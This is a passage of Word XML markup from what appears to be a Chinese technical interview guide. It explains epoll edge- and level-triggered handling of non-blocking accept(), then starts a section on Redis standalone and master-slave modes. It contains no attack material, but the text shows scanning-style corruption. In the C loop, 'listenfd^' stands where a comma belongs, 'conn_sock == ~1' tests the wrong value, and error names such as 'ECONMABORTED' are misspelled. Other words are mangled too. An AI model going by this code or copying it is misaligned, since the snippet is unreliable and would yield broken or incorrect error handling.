          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>设置为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EAGAIN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就表示所有连接都处理完。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>综合以上两种情况，服务器应该使用非阻塞地</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept, accept</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式下的正确使用 方式为：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">while </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(conn_sock </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>accept(listenfd^(struct sockaddr *) &amp;remote,</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(size_t *)&amp;addrlen)) &gt; 0) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>handle__client (conn_sock);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (conn_sock == ~1) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (errno != EAGAIN &amp;&amp; errno != ECONMABORTED &amp;&amp;</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errno != EPROTO &amp;&amp; errno != EINTR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="640" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>perror("accept");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="126" w:name="bookmark135"/>
      <w:bookmarkEnd w:id="126"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>模式只要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>available</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就会触发，所以：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="127" w:name="bookmark136"/>
      <w:bookmarkEnd w:id="127"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、读事件:因为一般应用层的逻辑是“来了就能读”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>所以一般没有问题，无需</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">while </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>循环读取到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>EAGAIN;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果应用层读緩冲区滴：就会经常触发，解决方式如下；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="128" w:name="bookmark137"/>
      <w:bookmarkEnd w:id="128"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、写事件：如果没有内容要写，就会经常触发，解决方式如下。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>经常触发读写事件的解决办法：修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>fd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的注册事件，或者把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>fd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>移出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">epollfdo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>总結：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="322" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>丄模式的优点在于：事件循环处理比较简单，无需关注应用层是否有緩冲或緩冲区是 否满，只管上报事件。缺点是：可能经常上报，可能影响性能。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="129" w:name="bookmark138"/>
      <w:bookmarkStart w:id="130" w:name="bookmark139"/>
      <w:bookmarkStart w:id="131" w:name="bookmark140"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>23. Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>有哪些架构模式?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="129"/>
      <w:bookmarkEnd w:id="130"/>
      <w:bookmarkEnd w:id="131"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>—</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Re dis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>单机模式</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：简单，直接运行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis-server redis. conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>即可(注意自己的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis-server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>文件 和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis. conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>文件的位置)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>缺点：1、内存容量有限2、处理能力有限3、无法高可用。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="132" w:name="bookmark141"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>二</w:t>
      </w:r>
      <w:bookmarkEnd w:id="132"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>主从复制模式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="319" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的复制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(replication)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>功能允许用户根据一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>服务器来创建任意多个该 服务器的复制品，其中被复制的服务器为主服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
